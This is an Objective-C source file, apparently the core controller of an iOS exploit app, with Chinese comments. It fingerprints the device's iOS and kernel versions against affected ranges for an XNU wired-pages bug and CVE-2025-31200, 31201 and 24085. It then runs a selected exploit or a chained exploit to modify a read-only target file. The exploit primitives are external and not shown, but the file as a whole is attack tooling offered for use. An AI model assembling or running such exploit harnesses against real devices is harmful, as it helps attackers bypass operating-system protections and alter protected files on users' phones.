// 作者：有问题联系～ pxx917144686

#import "ExploitCore.h"
#import <mach/mach.h>
#import <sys/mman.h>
#import <fcntl.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <errno.h>
#import <sys/sysctl.h>

// 定义常量
#define EXPLOIT_SUCCESS 0
#define EXPLOIT_FAILED -1
#define PAGE_SIZE 4096

// 导入POC函数原型
extern int exploit_vm_behavior(const char *path);
extern int exploit_cve_2025_31200(const char *path);
extern int exploit_cve_2025_31201(const char *path);
extern int exploit_cve_2025_24085(const char *path);

// 导入外部函数声明
extern int execute_chained_exploit(const char *target_path, void (^progress_callback)(int stage, const char *message, BOOL success));

@implementation ExploitCore

+ (instancetype)sharedInstance {
    static ExploitCore *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[self alloc] init];
    });
    return instance;
}

- (instancetype)init {
    if (self = [super init]) {
        _exploitStatus = @"未初始化";
        _currentVariant = ExploitVariantXNU;
    }
    return self;
}

- (void)prepareExploit {
    NSLog(@"[+] 准备漏洞利用环境");
    _exploitStatus = @"准备中...";
    _isExploitEnabled = [self checkDeviceVulnerability];
}

- (BOOL)checkDeviceVulnerability {
    // 检查设备是否可能受到漏洞影响
    NSLog(@"[+] 检查设备漏洞状态");
    
    // 获取iOS版本
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    
    // 获取内核版本
    char kernelVersion[256];
    size_t size = sizeof(kernelVersion);
    sysctlbyname("kern.osrelease", kernelVersion, &size, NULL, 0);
    
    NSLog(@"[*] 设备信息: iOS %ld.%ld.%ld, 内核版本: %s", 
          (long)version.majorVersion, 
          (long)version.minorVersion, 
          (long)version.patchVersion,
          kernelVersion);
    
    // 检查各个漏洞的影响版本
    BOOL xnuVulnerable = (version.majorVersion >= 14 && version.majorVersion <= 16);
    BOOL cve2025_31200_vulnerable = (version.majorVersion >= 15 && version.majorVersion <= 18 && 
                                   (version.majorVersion != 18 || version.minorVersion <= 2));
    BOOL cve2025_31201_vulnerable = (version.majorVersion >= 17 && version.majorVersion <= 18 && 
                                   (version.majorVersion != 18 || version.minorVersion <= 3));
    BOOL cve2025_24085_vulnerable = (version.majorVersion >= 16 && version.majorVersion <= 18 &&
                                    (version.majorVersion == 16 ? version.minorVersion >= 5 : true) &&
                                    (version.majorVersion == 18 ? version.minorVersion <= 4 : true));
    
    if (xnuVulnerable || cve2025_31200_vulnerable || cve2025_31201_vulnerable || cve2025_24085_vulnerable) {
        NSMutableArray *vulnerabilities = [NSMutableArray array];
        if (xnuVulnerable) [vulnerabilities addObject:@"XNU VM_BEHAVIOR_ZERO_WIRED_PAGES"];
        if (cve2025_31200_vulnerable) [vulnerabilities addObject:@"CVE-2025-31200"];
        if (cve2025_31201_vulnerable) [vulnerabilities addObject:@"CVE-2025-31201"];
        if (cve2025_24085_vulnerable) [vulnerabilities addObject:@"CVE-2025-24085"];
        
        _exploitStatus = [NSString stringWithFormat:@"设备可能受影响: %@", [vulnerabilities componentsJoinedByString:@", "]];
        return YES;
    } else {
        _exploitStatus = @"设备可能不受影响";
        return NO;
    }
}

- (void)setExploitVariant:(ExploitVariant)variant {
    _currentVariant = variant;
    
    NSString *variantName = [self getExploitVariantDescription];
    NSLog(@"[*] 已选择漏洞利用变体: %@", variantName);
}

- (void)runExploitWithPath:(NSString *)path completion:(void (^)(BOOL success, NSString *message))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        NSLog(@"[*] 开始执行漏洞利用: %@", path);
        self->_exploitStatus = @"正在利用漏洞...";
        
        int result = EXPLOIT_FAILED;
        
        // 根据选择的变体执行不同的漏洞利用
        switch (self->_currentVariant) {
            case ExploitVariantXNU:
                result = exploit_vm_behavior([path UTF8String]);
                break;
                
            case ExploitVariantCVE_2025_31200:
                result = exploit_cve_2025_31200([path UTF8String]);
                break;
                
            case ExploitVariantCVE_2025_31201:
                result = exploit_cve_2025_31201([path UTF8String]);
                break;
                
            case ExploitVariantCVE_2025_24085:
                result = exploit_cve_2025_24085([path UTF8String]);
                break;
        }
        
        if (result == EXPLOIT_SUCCESS) {
            self->_exploitStatus = @"漏洞利用成功";
            NSLog(@"[+] 漏洞利用成功!");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(YES, @"文件已成功修改");
            });
        } else {
            self->_exploitStatus = @"漏洞利用失败";
            NSLog(@"[-] 漏洞利用失败");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(NO, [NSString stringWithFormat:@"错误代码: %d", result]);
            });
        }
    });
}

// 实现攻击链方法
- (void)runChainedExploitWithPath:(NSString *)path 
                  stageCompletion:(ChainStageCallback)stageCallback
                       completion:(void (^)(BOOL success, NSString *message))completion {
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        NSLog(@"[*] 开始执行漏洞链攻击: %@", path);
        self->_exploitStatus = @"正在执行漏洞链...";
        
        int result = execute_chained_exploit([path UTF8String], ^(int stage, const char *message, BOOL success) {
            NSString *stageMsg = [NSString stringWithUTF8String:message];
            
            dispatch_async(dispatch_get_main_queue(), ^{
                stageCallback(stage, stageMsg, success);
            });
        });
        
        if (result == EXPLOIT_SUCCESS) {
            self->_exploitStatus = @"漏洞链攻击成功";
            NSLog(@"[+] 漏洞链攻击成功!");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(YES, @"漏洞链攻击完成，目标已成功修改");
            });
        } else {
            self->_exploitStatus = @"漏洞链攻击部分失败";
            NSLog(@"[-] 漏洞链攻击部分失败");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(NO, [NSString stringWithFormat:@"漏洞链未完全成功，错误代码: %d", result]);
            });
        }
    });
}

- (NSString *)createTestFile {
    NSLog(@"[*] 创建测试文件");
    
    // 创建测试目录
    NSString *documentsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *testDir = [documentsDir stringByAppendingPathComponent:@"ExploitTest"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:testDir]) {
        [fileManager createDirectoryAtPath:testDir withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    // 创建测试文件
    NSString *testFile = [testDir stringByAppendingPathComponent:@"test.txt"];
    
    // 填充测试数据 (类似原始PoC中的全部是A的文件)
    NSMutableData *testData = [NSMutableData dataWithCapacity:0x8000];
    char testChar = 'A';
    for (int i = 0x8000; i > 0; i--) {
        [testData appendBytes:&testChar length:1];
    }
    
    // 写入文件
    [testData writeToFile:testFile atomically:YES];
    
    // 设置为只读
    NSDictionary *attributes = @{NSFileImmutable: @YES};
    [fileManager setAttributes:attributes ofItemAtPath:testFile error:nil];
    
    NSLog(@"[+] 测试文件已创建: %@", testFile);
    return testFile;
}

- (BOOL)removeTestFile:(NSString *)path {
    NSLog(@"[*] 清理测试文件");
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    // 先恢复文件可写
    NSDictionary *attributes = @{NSFileImmutable: @NO};
    [fileManager setAttributes:attributes ofItemAtPath:path error:nil];
    
    // 删除文件
    NSError *error;
    BOOL success = [fileManager removeItemAtPath:path error:&error];
    
    if (!success) {
        NSLog(@"[-] 删除文件失败: %@", error.localizedDescription);
        return NO;
    }
    
    NSLog(@"[+] 测试文件已删除");
    return YES;
}

@end
